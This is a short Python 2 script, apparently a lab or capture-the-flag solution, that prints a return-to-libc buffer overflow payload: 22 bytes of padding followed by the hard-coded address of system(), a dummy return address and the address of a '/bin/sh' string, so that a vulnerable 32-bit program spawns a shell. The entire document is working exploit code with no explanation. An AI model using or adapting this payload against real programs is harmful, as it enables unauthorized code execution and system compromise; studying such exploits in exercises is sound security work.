from shellcode import shellcode
from struct import pack

sys_addr = 0x804ef50
bin_sh_addr = 0x80bc8e0

print "A"*22 + pack("<I", sys_addr) + "A"*4 + pack("<I", bin_sh_addr)
